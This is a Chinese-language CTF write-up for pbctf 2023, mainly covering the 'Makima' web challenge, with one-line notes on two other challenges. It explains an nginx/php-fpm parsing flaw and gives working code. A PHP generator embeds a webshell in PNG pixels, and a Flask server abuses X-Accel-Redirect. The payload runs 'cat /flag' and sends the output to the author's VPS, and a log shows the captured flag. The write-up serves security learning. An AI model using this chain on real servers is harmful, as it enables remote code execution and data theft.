---
title: "pbctf 2023 题解"
date: 2023-02-21 17:46:17
tags:
  - CTF
description: "pbctf 2023 题目题解：Makima、The Mindful Zone、git-ls-api"
---

# pbctf 2023 题解

## Makima

**Makima simps check in here:** [http://makima.chal.perfect.blue/](http://makima.chal.perfect.blue/)

### 比赛的时候的思考

简单看了下代码，一个nginx php主服务，python做cdn

逻辑是：

php接受url fpm怎么打

url发送给cdn

cdn发送网络请求 r = requests.get(url, stream=True)

获取图像返回给php 设置返回头除了：Date，Server？？可以设置返回头可以干什么

php保存 最近爆了个 ImageMagick 漏洞 试了一下不能直接打

### 赛后复现

参考这位师傅的wp：[https://github.com/Arc-blroth/ctf-writeups/blob/master/2023/pb/makima.md](https://github.com/Arc-blroth/ctf-writeups/blob/master/2023/pb/makima.md)

#### nginx + php-fpm 导致解析漏洞

**nginx配置文件**

```nginx
server {
    listen 8080 default_server;   # 监听端口为8080，作为默认服务
    listen [::]:8080 default_server; # 监听IPv6地址的端口为8080
    root /var/www/html;   # 网站根目录为/var/www/html
    server_name _;   # 服务器名为任意字符

    location / {   # 匹配所有请求路径为 /
        index index.php;   # 默认首页为index.php
    }

    location ~ \.php$ {   # 匹配所有以.php结尾的请求
        internal;   # 只能由内部请求访问
        include fastcgi_params;   # 引入FastCGI参数
        fastcgi_intercept_errors on;   # FastCGI出错时不返回给客户端
        fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;   # 设置FastCGI参数SCRIPT_FILENAME
        fastcgi_pass unix:/run/php/php7.4-fpm.sock;   # PHP-FPM监听的socket地址
    }

    location /cdn/ {   # 匹配请求路径为 /cdn/
        allow 127.0.0.1/32;   # 允许127.0.0.1/32的IP地址访问
        deny all;   # 其他IP地址禁止访问
        proxy_pass http://cdn;   # 反向代理到 http://cdn
    }
}
```

`internal;`: 声明这个 location 只能在内部使用，不能被外部直接访问。

**[www.conf](http://www.conf/)**

在 PHP-FPM 中，[www.conf](http://www.conf/) 是默认的 FPM 池配置文件，用于控制 PHP-FPM 进程池的行为。去掉注释后的配置如下

```
[www]                      # 进程池名称
user = www-data            # PHP-FPM 进程所属的用户
group = www-data           # PHP-FPM 进程所属的用户组
listen = /run/php/php7.4-fpm.sock  # PHP-FPM 进程监听的 Unix 套接字文件路径
listen.owner = www-data    # 监听套接字文件的所有者
listen.group = www-data    # 监听套接字文件的所有者组
pm = dynamic               # PHP-FPM 进程管理模式，动态模式
pm.max_children = 5        # 进程池最多可以创建的工作进程数
pm.start_servers = 2       # PHP-FPM 启动时创建的工作进程数
pm.min_spare_servers = 1   # 进程池中保持最少空闲工作进程数
pm.max_spare_servers = 3   # 进程池中保持最多空闲工作进程数
security.limit_extensions = # 安全限制，只允许执行具有特定扩展名的 PHP 脚本
```

`security.limit_extensions` 是一个 PHP-FPM 的安全限制，它可以限制 PHP-FPM 执行脚本的扩展名。设置该选项可以帮助防止恶意脚本和攻击，因为一些恶意脚本会使用伪造的扩展名来绕过服务器的安全机制，执行恶意代码。

[https://nealpoole.com/blog/2011/04/setting-up-php-fastcgi-and-nginx-dont-trust-the-tutorials-check-your-configuration/](https://nealpoole.com/blog/2011/04/setting-up-php-fastcgi-and-nginx-dont-trust-the-tutorials-check-your-configuration/)

由于nginx的设置和php-fpm的默认配置导致的解析漏洞使得：上传一个1.jpg文件 然后访问1.jpg/1.php 1.jpg会被当做php文件执行

#### 构建恶意图片

[https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)

```php
<?php
$_payload = '<?=file_get_contents("http://my_vps:8083/image.png?res=".`cat /flag`)?>';
$output = 'rce.png';
    
while (strlen($_payload) % 3 != 0) { $_payload.=" "; }

$_pay_len=strlen($_payload);
if ($_pay_len > 256*3){
    echo "FATAL: The payload is too long. Exiting...";
    exit();
}
if($_pay_len %3 != 0){
    echo "FATAL: The payload isn't divisible by 3. Exiting...";
    exit();
}

$width=$_pay_len/3;
$height=20;
$im = imagecreate($width, $height);
    
$_hex=unpack('H*',$_payload);
$_chunks=str_split($_hex[1], 6);
    
for($i=0; $i < count($_chunks); $i++){
    $_color_chunks=str_split($_chunks[$i], 2);
    $color=imagecolorallocate($im, hexdec($_color_chunks[0]), hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));
    imagesetpixel($im,$i,1,$color);
}
    
imagepng($im,$output);
?>
```

这样就能使得被服务端处理后的图片中**仍然有**构建的php代码

#### nginx internal 的访问

这里的内部访问是nginx发起的请求，详细参考nginx文档

[https://nginx.org/en/docs/http/ngx_http_core_module.html#internal](https://nginx.org/en/docs/http/ngx_http_core_module.html#internal)

无法控制nginx的配置文件，关注到里面的 **requests redirected by the “X-Accel-Redirect” response header field from an upstream server;**

But after [reading a bit more](https://blog.horejsek.com/nginx-x-accel-explained/) of the (surprisingly little documentation) on `X-Accel-Redirect`, I discovered that NGINX treats `*_pass` servers as upstream servers for the purpose of `X-Accel-Redirect`.

在cdn中我们可以控制任意响应头

```python
@app.route("/cdn/<path:url>")
def cdn(url):
    mimes = ["image/png", "image/jpeg", "image/gif", "image/webp"]
    r = requests.get(url, stream=True)
    if r.headers["Content-Type"] not in mimes:
        print("BAD MIME")
        return "????", 400
    img_resp = make_response(r.raw.read(), 200)
    for header in r.headers:
        if header == "Date" or header == "Server":
            continue
        img_resp.headers[header] = r.headers[header] # 可以设置任意响应头
    return img_resp
```

现在我们构建一个evilserver

```python
#!/usr/bin/python3
from flask import Flask, send_file, make_response

app = Flask(__name__)

@app.route("/image.png")
def fakeserver():
    response = make_response(send_file("rce.png",mimetype='image/png')) # rce.png为生成用于绕过image转化的png
    response.headers['Content-Type'] = 'image/png'
    return response

@app.route("/image2.png")
def rceserver():
    response = make_response()
    response.headers['Content-Type'] = 'image/png'
    response.headers['X-Accel-Redirect'] = '/uploads/be82c42dac96a.png/1.php'
    return response

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0" ,port=8083)
```

然后先上传图片：url=[http://my_vps:8083/image.png](http://my_vps:8083/image.png)

修改 /image2.png路由中的 response.headers[‘X-Accel-Redirect’] 对应部分为上传图片路径

再RCE：url=[http://my_vps:8083/image2.png](http://my_vps:8083/image2.png)

```bash
34.67.131.140 - - [21/Feb/2023 23:03:08] "GET /image.png HTTP/1.1" 200 -
 * Detected change in '/home/ubuntu/ctf/pbctf/fakeserver/app.py', reloading
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 914-115-437
34.67.131.140 - - [21/Feb/2023 23:03:25] "GET /image2.png HTTP/1.1" 200 -
34.67.131.140 - - [21/Feb/2023 23:03:26] "GET /image.png?res=pbctf{actually_power_is_the_better_character} HTTP/1.0" 200 -
```

#### 总结

发现解析漏洞 -> 上传一个图片马 -> 通过cdn internal访问 -> RCE

## The Mindful Zone

最新版的 zoneminder 0day

apache 2.4.29 解析漏洞

## git-ls-api

ruby
